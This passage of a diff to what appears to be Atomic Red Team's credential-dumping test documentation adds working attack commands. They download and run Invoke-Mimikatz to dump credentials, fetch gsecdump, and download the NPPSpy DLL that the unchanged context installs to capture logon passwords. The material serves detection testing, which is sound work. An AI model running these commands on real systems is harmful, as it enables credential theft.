@@ -471,6 +471,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-gsecdump-must-exist-on-disk-at-specified-location-gsecdump-exe">
+         Description: Gsecdump must exist on disk at specified location (#{gsecdump_exe})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -489,6 +517,34 @@
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id1">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-nppspy-dll-must-be-available-in-local-temp-directory">
+         Description: NPPSpy.dll must be available in local temp directory
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id2">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id3">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id4">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
         <span class="pre">
@@ -548,10 +604,11 @@
 If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
 Common failures include seeing an “access denied” error which results when Anti-Virus blocks execution.
 Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen “ERROR kuhl_m_sekurlsa_acquireLSA”</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;#{remote_script}&#39;</span><span class="p">);</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -570,10 +627,41 @@ Or, if you try to run the test without the required administrative privleges you
 <p>If you see output that says “compat: error: failed to create child process”, execution was likely blocked by Anti-Virus.
 You will receive only error output if you do not run this test from an elevated context (run as administrator)</p>
 <p>If you see a message saying “The system cannot find the path specified”, try using the get-prereq_commands to download and install Gsecdump first.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-gsecdump-must-exist-on-disk-at-specified-location-gsecdump-exe">
+<h5>Description: Gsecdump must exist on disk at specified location (#{gsecdump_exe})<a class="headerlink" href="#description-gsecdump-must-exist-on-disk-at-specified-location-gsecdump-exe" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">gsecdump</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
+<span class="nv">$parentpath</span> <span class="p">=</span> <span class="nb">Split-Path</span> <span class="s2">&quot;PathToAtomicsFolder\T1003\bin\gsecdump.exe&quot;</span><span class="p">;</span> <span class="nv">$binpath</span> <span class="p">=</span> <span class="s2">&quot;$parentpath\gsecdump-v2b5.exe&quot;</span>
+<span class="n">IEX</span><span class="p">(</span><span class="nb">IWR </span><span class="s2">&quot;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1&quot;</span><span class="p">)</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">Invoke-WebRequestVerifyHash</span> <span class="s2">&quot;https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe&quot;</span> <span class="s2">&quot;$binpath&quot;</span> <span class="n">94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC</span><span class="p">){</span>
+  <span class="nb">Move-Item</span> <span class="nv">$binpath</span> <span class="s2">&quot;PathToAtomicsFolder\T1003\bin\gsecdump.exe&quot;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>#{gsecdump_exe} -a
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>PathToAtomicsFolder\T1003\bin\gsecdump.exe -a
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -591,9 +679,35 @@ You will receive only error output if you do not run this test from an elevated 
 After user’s logging in cleartext password is saved in C:\NPPSpy.txt.
 Clean up deletes the files and reverses Registry changes.
 NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
-<strong>Supported Platforms:</strong> windows</p>
+<strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id1">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-nppspy-dll-must-be-available-in-local-temp-directory">
+<h5>Description: NPPSpy.dll must be available in local temp directory<a class="headerlink" href="#description-nppspy-dll-must-be-available-in-local-temp-directory" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id2">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="s2">&quot;$env:Temp\NPPSPY.dll&quot;</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id3">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile &quot;$env:Temp\NPPSPY.dll&quot;
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="id4">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Copy-Item &quot;$env:Temp\NPPSPY.dll&quot; -Destination &quot;C:\Windows\System32&quot;
 $path = Get-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order&quot; -Name PROVIDERORDER
 $UpdatedValue = $Path.PROVIDERORDER + &quot;,NPPSpy&quot;
